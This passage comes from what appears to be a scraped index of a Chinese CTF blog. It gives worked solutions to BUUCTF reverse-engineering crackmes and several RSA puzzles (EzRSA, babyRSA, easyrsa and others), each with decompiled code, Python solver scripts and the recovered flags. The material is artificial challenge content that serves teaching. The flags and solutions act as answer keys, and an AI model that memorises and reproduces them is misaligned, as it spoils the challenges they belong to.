puts(&quot;Try again!\\n&quot;); return __readfsqword(0x28u) ^ v12; } 先是将两个字符串拼接成keys，然后转化为小写，然后将其进行了加密，再与text进行比较 脚本 text = 'killshadow' key = 'adsfkndcls' #暴力字典破解 v3=0 v5=len(key) dict1=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; flag = &quot;&quot; for i in range(0,10): n=0 for char in dict1: x = (ord(char) - 39 - ord(key[v3%v5])+97)%26+97 if(chr(x)==text[i]): n = n+1 if(n==1): print(char,end=&quot;&quot;) v3=v3+1 flag{KLDQCUDFZO} ","link":"https://scarecr0w7.github.io/post/reverseorbuuctf-simplerev/"},{"title":"Reverse｜Buuctf reverse3","content":"查壳为32位程序，使用32位ida打开 查询到rright flag字符 查看伪代码 __int64 main_0() { size_t v0; // eax const char *v1; // eax size_t v2; // eax int v3; // edx __int64 v4; // ST08_8 signed int j; // [esp+DCh] [ebp-ACh] signed int i; // [esp+E8h] [ebp-A0h] signed int v8; // [esp+E8h] [ebp-A0h] char Dest[108]; // [esp+F4h] [ebp-94h] char Str; // [esp+160h] [ebp-28h] char v11; // [esp+17Ch] [ebp-Ch] for ( i = 0; i &lt; 100; ++i ) { if ( (unsigned int)i &gt;= 0x64 ) j____report_rangecheckfailure(); Dest[i] = 0; } sub_41132F(&quot;please enter the flag:&quot;); sub_411375(&quot;%20s&quot;, &amp;Str); v0 = j_strlen(&amp;Str); v1 = (const char *)sub_4110BE(&amp;Str, v0, &amp;v11); strncpy(Dest, v1, 0x28u); v8 = j_strlen(Dest); for ( j = 0; j &lt; v8; ++j ) Dest[j] += j; v2 = j_strlen(Dest); if ( !strncmp(Dest, Str2, v2) ) sub_41132F(&quot;rigth flag!\\n&quot;); else sub_41132F(&quot;wrong flag!\\n&quot;); HIDWORD(v4) = v3; LODWORD(v4) = 0; return v4; } 输入一个字符串经过sub_4110BE函数进行加密，再通过一个for循环进行变换，然后与str2进行比较 .rdata:00417B30 aAbcdefghijklmn db 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' sub_4110BE函数将3个字符变成4个字符，结合aAbcdefghijklmn的值，可以判断是base64 脚本 import base64 str = 'e3nifIH9b_C@n@dH' flag = '' for i in range(len(str)): flag += chr(ord(str[i])-i) print(base64.b64decode(flag)) flag{i_l0ve_you} ","link":"https://scarecr0w7.github.io/post/reverseorbuuctf-reverse3/"},{"title":"Reverse｜Buuctf xor","content":" 程序为mac 64位应用，且未加壳，使用ida64位程序打开 查看快捷键查看字符串，发现flag字符，下方有个success，猜测是输入正确的字符串后会输出success 点击进入，查看伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rsi int result; // eax signed int i; // [rsp+2Ch] [rbp-124h] char v6[264]; // [rsp+40h] [rbp-110h] __int64 v7; // [rsp+148h] [rbp-8h] memset(v6, 0, '\\x01\\0'); v3 = (char *)256; printf(&quot;Input your flag:\\n&quot;, 0LL); get_line(v6, 256LL); if ( strlen(v6) != 33 ) goto LABEL_12; for ( i = 1; i &lt; 33; ++i ) v6[i] ^= v6[i - 1]; v3 = global; if ( !strncmp(v6, global, '!') ) printf(&quot;Success&quot;, v3); else LABEL_12: printf(&quot;Failed&quot;, v3); result = __stack_chk_guard; if ( __stack_chk_guard == v7 ) result = 0; return result; } if ( strlen(v6) != 33 )，这里先判断字符长度是不是33位 for ( i = 1; i &lt; 33; ++i ) v6[i] ^= v6[i - 1];，然后进行异或运算 查看前面的汇编代码，发现了字母和16进制数字 需要将十六进制转为字符，再与前一位进行异或运算即可得到flag 脚本 string = ['f', 0x0A, 'k', 0x0C, 'w', '&amp;', 'O', '.', '@', 0x11, 'x', 0x0D, 'Z', ';', 'U', 0x11, 'p', 0x19, 'F', 0x1F, 'v', '&quot;', 'M', '#', 'D', 0x0E, 'g', 6, 'h', 0x0F, 'G', '2', 'O'] for i in range(1, len(string)): if (isinstance(string[i], int)): string[i] = chr(string[i]) string = ''.join(string) flag = 'f' for i in range(1, len(string)): flag += chr(ord(string[i]) ^ ord(string[i-1])) print(flag) flag{QianQiuWanDai_YiTongJiangHu} ","link":"https://scarecr0w7.github.io/post/reverseorbuuctf-xor/"},{"title":"Reverse｜Buuctf reverse1","content":"查看程序信息 Detect It Easy查看程序信息，发现是64位应用且未加壳 反编译文件 使用IDA打开，shift+f12检索程序里的字符串，发现this is the right flag!，双击查看，发现被main_0函数引用 双击main_0函数查看 F5查看伪代码 int __cdecl main_0(int argc, const char **argv, const char **envp) { char *v3; // rdi __int64 i; // rcx size_t v5; // rax char v7; // [rsp+0h] [rbp-20h] BYREF int j; // [rsp+24h] [rbp+4h] char Str1[224]; // [rsp+48h] [rbp+28h] BYREF __int64 v10; // [rsp+128h] [rbp+108h] v3 = &amp;v7; for ( i = 82i64; i; --i ) { *(_DWORD *)v3 = -858993460; v3 += 4; } for ( j = 0; ; ++j ) { v10 = j; if ( j &gt; j_strlen(Str2) ) break; if ( Str2[j] == 111 ) Str2[j] = 48; } sub_1400111D1(&quot;input the flag:&quot;); sub_14001128F(&quot;%20s&quot;, Str1); v5 = j_strlen(Str2); if ( !strncmp(Str1, Str2, v5) ) sub_1400111D1(&quot;this is the right flag!\\n&quot;); else sub_1400111D1(&quot;wrong flag\\n&quot;); return 0; } 通过 if ( !strncmp(Str1, Str2, v5) )，可以发现当输入的字符str1与预定的字符str2相等就为正确的flag 双击str2发现str2为{hello_world}，所以flag为{hello_world}，但是输入提示错误 再查看伪代码发现以下代码，这里将str2中的111替换为了48，这里看不懂111和48是什么 if ( Str2[j] == 111 ) Str2[j] = 48; 这是111和48为int，是asicc码，使用快捷键R转换一下 可以看出这里是将o替换为了0，所以可以得出flag flag{hell0_w0rld} ","link":"https://scarecr0w7.github.io/post/reverseorbuuctf-reverse1/"},{"title":"Crypto｜[NPUCTF2020]EzRSA","content":"attachment.py from gmpy2 import lcm , powmod , invert , gcd , mpz from Crypto.Util.number import getPrime from sympy import nextprime from random import randint p = getPrime(1024) q = getPrime(1024) n = p * q gift = lcm(p - 1 , q - 1) e = 54722 flag = b'NPUCTF{******************}' m = int.from_bytes(flag , 'big') c = powmod(m , e , n) print('n: ' , n) print('gift: ' , gift) print('c: ' , c) #n: 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121 #gift: 2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104 #c: 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319 分析 gift = lcm(p - 1 , q - 1)，lcm为求最小公倍数 因为：最小公倍数(𝑝,𝑞)∗最大公因数(𝑝,𝑞)=𝑝∗𝑞最小公倍数(𝑝,𝑞) ∗ 最大公因数(𝑝,𝑞) = 𝑝∗𝑞最小公倍数(p,q)∗最大公因数(p,q)=p∗q 代入：𝑔𝑖𝑓𝑡∗𝑔𝑐𝑑(𝑝−1,𝑞−1)=(𝑝−1)∗(𝑞−1)=𝜙(𝑛) 根据已知的数据𝑔𝑖𝑓𝑡 的二进制位数为2045，𝜙(𝑛)=(𝑝−1)∗(𝑞−1) 的位数为2048，可以计算得𝑔𝑐𝑑(𝑝−1,𝑞−1) 占3bits 最大公因数的范围（十进制）为4～8，可以在此范围内遍历最大公因数的值 但是𝑒值不是素数，需要进行分解 解密 from Crypto.Util.number import * import gmpy2 e = 54722 n = 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121 gift = 2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104 c = 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319 for gcd_val in range(4, 8): phi = gift * gcd_val try: d = gmpy2.invert(e // 2, phi) m_2 = pow(c, int(d), n) flag = long_to_bytes(gmpy2.isqrt(m_2)) print(flag) except ZeroDivisionError: continue b'NPUCTF{diff1cult_rsa_1s_e@sy}' ","link":"https://scarecr0w7.github.io/post/cryptoornpuctf2020ezrsa/"},{"title":"Crypto｜[BJDCTF2020]RSA","content":"task.py from Crypto.Util.number import getPrime,bytes_to_long flag=open(&quot;flag&quot;,&quot;rb&quot;).read() p=getPrime(1024) q=getPrime(1024) assert(e&lt;100000) n=p*q m=bytes_to_long(flag) c=pow(m,e,n) print c,n print pow(294,e,n) p=getPrime(1024) n=p*q m=bytes_to_long(&quot;BJD&quot;*32) c=pow(m,e,n) print c,n ''' output: 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 ''' 解析 已知了两次输出的c和n，pow(294,e,n)值 要求m需要知道d，求d需要e、p和q的值 e可以根据pow(294,e,n)来爆破，也可以根据第二次的c和n来爆破 已知n1n_1n1​和n2n_2n2​的值，且n1n_1n1​ = p1p_1p1​*q，n2n_2n2​ = p2p_2p2​*q，所以n1n_1n1​和n2n_2n2​的最大公因数为q，可以根据n1n_1n1​和n2n_2n2​的值求得q，以求得p 求e c = 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018 n = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 for e in range(100000): res = pow(294,e,n) if res == c: print(e) break 52361 解密 import libnum from gmpy2 import * e = 52361 c = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 n = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 n1 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 q = gcd(n, n1) p = n // q d = libnum.invmod(e, (p-1)*(q-1)) m = pow(c, d, n) print(libnum.n2s(int(m)).decode()) BJD{p_is_common_divisor} ","link":"https://scarecr0w7.github.io/post/cryptoorbjdctf2020rsa/"},{"title":"Crypto｜[BJDCTF2020]easyrsa","content":"rsa_task.py from Crypto.Util.number import getPrime,bytes_to_long from sympy import Derivative from fractions import Fraction from secret import flag p=getPrime(1024) q=getPrime(1024) e=65537 n=p*q z=Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arth(q),q)) m=bytes_to_long(flag) c=pow(m,e,n) print(c,z,n) ''' output: 7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035 32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482 15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441 ''' 解析 已知c, z, n, e的值 求d即可求得m，所以最后需要求得p和q的 p和q可以由z求得 z=Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arth(q),q)) 𝑧=1𝑎𝑟𝑐𝑡𝑎𝑛′(𝑝)\\frac{1}{𝑎𝑟𝑐𝑡𝑎𝑛′(𝑝)}arctan′(p)1​ − 1𝑎𝑟𝑡h′(𝑞)\\frac{1}{𝑎𝑟𝑡ℎ′(𝑞)}arth′(q)1​ 其中𝑎𝑟𝑐𝑡𝑎𝑛′(𝑝)=11+𝑝2\\frac{1}{1+𝑝^2}1+p21​，𝑎𝑟𝑡ℎ′(𝑞)=11−q2\\frac{1}{1-q^2}1−q21​ 因此有𝑧=𝑝2𝑝^2p2+𝑞2𝑞^2q2，且已知n = p*q 求pq from z3 import * p = Int('p') q = Int('q') s = Solver() s.add(p**2 + q**2 == z) s.add(p*q == n) if s.check()==sat: print(s.model()) q = 105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141 p = 144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301 解密文 import libnum c = 7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035 z = 32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482 n = 15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441 q = 105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141 p = 144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301 phi_n = (p-1)*(q-1) e = 65537 d = libnum.invmod(e, phi_n) m = pow(c, d, n) print(libnum.n2s(int(m)).decode()) BJD{Advanced_mathematics_is_too_hard!!!} ","link":"https://scarecr0w7.github.io/post/cryptoorbjdctf2020easyrsa/"},{"title":"Crypto｜[AFCTF2018]可怜的RSA","content":"public.key -----BEGIN PUBLIC KEY----- MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQMlsYv184kJfRcjeGa7Uc/4 3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59 NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT +EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM 5q5TAgMBAAE= -----END PUBLIC KEY----- flag.enc GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA== 读取public.key 读取public.key获取e和n from Crypto.PublicKey import RSA with open(&quot;pubckey.pem&quot;,&quot;rb&quot;) as f: key = RSA.import_key(f.read()) print('n = %d' % key.n) print('e = %d' % key.e) n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443 e = 65537 也可使用在线工具读取 分解n 使用factordb分解n p = 3133337 q = 25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939 解析明文 查看flag.enc可以发现密文是经过base64加密的，需要base64解码才能解析 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP from base64 import b64decode import libnum n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443 e = 65537 p = 3133337 q = 25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939 d = libnum.invmod(e, (p-1)*(q-1)) key_info = RSA.construct((n, e, d, p, q)) key = RSA.importKey(key_info.exportKey()) key = PKCS1_OAEP.new(key) f = open('flag.enc', 'r').read() c = b64decode(f) flag = key.decrypt(c) print(flag) b'afctf{R54_|5_$0_B0rin9}' ","link":"https://scarecr0w7.github.io/post/cryptoorafctf2018ke-lian-de-rsa/"},{"title":"Crypto｜[NCTF2019]babyRSA","content":"task.py from Crypto.Util.number import * from flag import flag def nextPrime(n): n += 2 if n &amp; 1 else 1 while not isPrime(n): n += 2 return n p = getPrime(1024) q = nextPrime(p) n = p * q e = 0x10001 d = inverse(e, (p-1) * (q-1)) c = pow(bytes_to_long(flag.encode()), e, n) # d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913 # c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804 解析 给出了e、d和c的值 p = getPrime(1024)、q = nextPrime(p)，p和q是1024个bit位的素数，并且p和q相邻 m = pow(c,d,n)，c、d已知所以需要求n n=pq，所以求p和q即可 根据rsa的公式：ed = 1 mod (p-1) ∗(q-1) 可得：ed - 1 = k * (p-1)(q-1) 根据已知的e和d求得ed - 1是2064位 p和q是1024个bit位，所以(p-1)(q-1)是2048位，相隔16位 可得k在范围2152^{15}215 ~ 2162^{16}216 得到k后对(p-1)*(q-1)进行开方，得到p，q则是p的下一个素数 解密脚本 import gmpy2 import sympy import libnum e = 0x10001 c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804 d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913 a = e*d-1 for k in range(pow(2,15),pow(2,16)): if a % k == 0: p = sympy.prevprime(gmpy2.iroot(a//k,2)[0]) q = sympy.nextprime(p) if (p-1)*(q-1)*k == a: break #p = 143193611591752210918770476402384783351740028841763223236102885221839966637073188462808195974548579833368313904083095786906479416347681923731100260359652426441593107755892485944809419189348311956308456459523437459969713060653432909873986596042482699670451716296743727525586437248462432327423361080811225075839 #q = 143193611591752210918770476402384783351740028841763223236102885221839966637073188462808195974548579833368313904083095786906479416347681923731100260359652426441593107755892485944809419189348311956308456459523437459969713060653432909873986596042482699670451716296743727525586437248462432327423361080811225076497 n = p*q m = gmpy2.powmod(c,d,n) print(libnum.n2s(int(m)).decode()) NCTF{70u2_nn47h_14_v3ry_gOO0000000d} &lt;!-- more --&gt; ","link":"https://scarecr0w7.github.io/post/cryptoornctf2019babyrsa/"},{"title":"Crypto｜[GWCTF 2019]BabyRSA","content":"encrypt.py import hashlib import sympy from Crypto.Util.number import * flag = 'GWHT{******}' secret = '******' assert(len(flag) == 38) half = len(flag) / 2 flag1 = flag[:half] flag2 = flag[half:] secret_num = getPrime(1024) * bytes_to_long(secret) p = sympy.nextprime(secret_num) q = sympy.nextprime(p) N = p * q e = 0x10001 F1 = bytes_to_long(flag1) F2 = bytes_to_long(flag2) c1 = F1 + F2 c2 = pow(F1, 3) + pow(F2, 3) assert(c2 &lt; N) m1 = pow(c1, e, N) m2 = pow(c2, e, N) output = open('secret', 'w') output.write('N=' + str(N) + '\\n') output.write('m1=' + str(m1) + '\\n') output.write('m2=' + str(m2) + '\\n') output.close() scret N=636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163 m1=90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239 